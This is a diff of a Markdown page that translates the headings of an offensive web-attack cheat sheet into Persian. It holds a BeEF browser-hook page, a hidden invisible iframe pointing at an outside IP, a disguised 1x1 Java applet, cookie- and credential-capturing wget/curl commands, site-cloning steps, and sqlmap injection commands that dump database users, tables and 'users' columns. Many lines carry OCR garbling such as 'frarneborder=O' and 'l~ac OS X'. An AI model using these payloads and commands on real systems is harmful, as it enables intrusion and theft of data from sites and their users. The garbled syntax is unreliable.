@@ -1,14 +1,15 @@
 ---
 layout: default
+published: true
 ---
 
-# Web
+# وب
 
-## Common user-agent strings
+## user-agent های متداول
 
 ### Internet explorer \(6.0, 7.0, 8.0, 9.0\)
 
-| **Agent** | **Version** |
+| **Agent** | **نسخه** |
 | :--- | :--- |
 | Mozilla/4.0 \(compatible; MSIE 6.0; Windows NT 5.1; SV1\) | IE 6.0/WinXP 32-bit |
 | Mozilla/ 4. 0 \(compatible; MSIE 7. 0; Windows NT 5.1; SV1; .NET CLR 2.0.50-2 7 \) | IE 7.0/WinXP 32-bit |
@@ -18,7 +19,7 @@ layout: default
 
 ### Firefox \(5.0, 13.0, 17.0\)
 
-| **Agent** | **Version** |
+| **Agent** | **نسخه** |
 | :--- | :--- |
 | Mozilla/5.0 \(Windows NT 6.1; WOW64; rv:5.0\) Gecko/20100101 Firefox/5.0 | Firefox 5.0/Win7 64-bit |
 | Mozilla/5.0 \(Windows NT 5.1; rv:13.0\) Gecko/20100101 Firefox/13.0.1 | Firefox 13.0/WinXP 32-bit |
@@ -29,7 +30,7 @@ layout: default
 
 ### Chrome \(Generic 13.0\)
 
-| **Agent** | **Version** |
+| **Agent** | **نسخه** |
 | :--- | :--- |
 | Mozilla/5.0 \(Windows NT 5.1\) AppleWebKit/537.11 \(KHTML, like Gecko\) Chrome/23.0.1271.97 Safari/53-.11 | Chrome Generic/WinXP |
 | Mozilla/5.0 \(Windows NT 6.1\) AppleWebKit/537 .11 \(KHTl~L, like Gecko\) Chrome/23.0.1271.97 Safari/53-.11 | Chrome Generic/Win7 |
@@ -45,15 +46,15 @@ layout: default
 
 ### Mobile safari \(4.0 & 6.0\)
 
-| **Agent** | **Version** |
+| **Agent** | **نسخه** |
 | :--- | :--- |
 | Mozilla/5.0 \(iPad; CPU OS 6 0 1 like Mac OS X\) AppleWebKit/536.26 \(KHTML, like Gecko\) Version/6.0 Mobile/10A523 Safari/8536.25 | Mobile Safari 6.0/iOS \(iPad\) |
 | Mozilla/5.0 \(iPhone; CPU iPhone OS 6 0 1 like l~ac OS X\) AppleWebKit/536.26 \(KHTML, like Gecko\) Version/6.0 Mobile/10A523 Safari/8536.25 | Mobile Safari 6.0/iOS \(iPhone\) |
 | Mozilla/5.0 \(Linux; U; Android 2.2; fr-fr; Desire A8181 Build/FRF91\) App3leWebKit/53.1 \(KHTML, like Gecko\) Version/4. 0 Mobile Safari/533.1 | Mobile Safari 4.0/Android |
 
-## HTML
+## زبان HTML
 
-### Html beef hook with embedded frame
+### کد beef جا ساز شده در iframe
 
 ```text
 !DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
@@ -77,7 +78,7 @@ frame src="/e" frarneborder=O scrolling=no noresize=noresize /
 /html
 ```
 
-### Embedded java applet \(\* place within &lt;body&gt; tag\)
+### کد java applet جاساز شده \(\* باید در &lt;body&gt; قرار بگیرد\)
 
 ```text
 applet archive="legit.jar" code="This is a legit applet" width="1"
@@ -85,7 +86,7 @@ height="1"
 /applet
 ```
 
-### Embedded iframe
+### iframe توکار
 
 ```text
 iframe src="http://1.1.1.1" width="0" height="0" frameborder="0"
@@ -93,7 +94,7 @@ tabindex="-1" title="empty" style="visibility:hidden;display:none"
 /iframe
 ```
 
-### Firefox type conversation
+### روش های ارتباط Firefox 
 
 ```text
 ASCII  -   Base64   javascript:btoa("ascii str")
@@ -102,43 +103,43 @@ ASCII  -   URI      javascript:encodeURI(" script "}
 URI    -   ASCII    javascript:decodeURI("%3cscript%3E")
 ```
 
-## Wget
+## دستور Wget
 
-### Capture session token
+### ضبط جلسه توکن
 
 ```text
 wget -q --save-cookies=cookie.txt --keep-session-cookies --post-
 data="username: admin&password=pass&Login=Login" http://url/login. php
 ```
 
-## Curl
+## دستور Curl
 
-### Grab headers and spoof user agent
+### دریافت headers صفحه وب با تغییر user agent
 
 ```text
 curl -I -X HEAD -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)"
 http:// ip
 ```
 
-### Scrape site after login
+### دریافت صفحه پس از احراز هویت
 
 ```text
 curl -u user:pass -o outfile https://login.bob.com
 ```
 
-### Ftp
+### دستور Ftp
 
 ```text
 curl ftp://user:pass@bob.com/directory/
 ```
 
-### Sequential lookup
+### بررسی فایل های مختلف
 
 ```text
 curl http://bob.com/file[l-10] .txt
 ```
 
-### Basic authentication using apache2
+### ایجاد Basic authentication در apache2
 
 ```text
 The steps below will clone a website and redirect after 3 seconds to
@@ -175,9 +176,9 @@ content="3;url=http:// domainlip /1/index.html"/
     http:// domainlip /index.html
 ```
 
-## Automated web page screenshots
+## خودکار سازی فرآیند عکس از صفحه وب
 
-### Nmap web page screenshots\[9\]
+### با استفاده از nmap
 
 ```text
 Install dependencies:
@@ -205,7 +206,7 @@ width=400 BR BR ")' preview. html
 printf " /BODY /HTML. " preview. html
 ```
 
-### Peepingtom web page screenshots
+### دستور Peepingtom 
 
 ```text
 Install Dependencies:
@@ -219,28 +220,28 @@ Run PeepingTom
     python peepingtom.py http:// mytarget.com
 ```
 
-## Sqlmap
+## دستور Sqlmap
 
-### Get request
+### ارسال درخواست Get
 
 ```text
 ./sqlmap.py -u "http:// url ?id=1&str=val"
 ```
 
-### Post request
+### ارسال درخواست Post
 
 ```text
 ./sqlmap.py -u "http:// url " --data="id=1&str=val"
 ```
 
-### Sql injection against specific parameter with db type specified
+### تزریق sql در پارامتر خاص و دانستن نوع دیتابیس 
 
 ```text
 ./sqlmap.py -u "http:// url" --data="id=l&str=val" -p "id"
 -b --dbms=" mssqllmysqlloraclelpostgres "
 ```
 
-### Sql injection on authentication site
+### تزریق sql در صفحه نیازمند احراز هویت 
 
 ```text
 1.Login and note cookie value (cookie1=val1, cookie2=val2)
@@ -248,26 +249,23 @@ Run PeepingTom
 --cookie="cookiel=vall;cookie2=val2"
 ```
 
-### Sql injection and collect db version, name, and user
+### تزریق sql و دریافت نسخه پایگاه داده و نام و کاربر آن 
 
 ```text
 ./sqlmap.py -u "http:// url " --data="id=1&str=val" -p "id" -b --current-db
 --current-user
 ```
 
-### Sql injection and get tables of db=testdb
+### تزریق sql و دریافت جداول پایگاه داده db=testdb
 
 ```text
 ./sqlmap.py -u "http:// url " --data="id=1&str=val" -p "id" --tables -D
 "testdb"
 ```
 
-### Sql injection and get columns of user table
+###  تزریق sql و دریافت ستون های جدول
 
 ```text
 ./sqlrnap.py -u "http:// url " --data="id=l&str=val" -p "id" --columns -T
 "users"
 ```
-
-
-
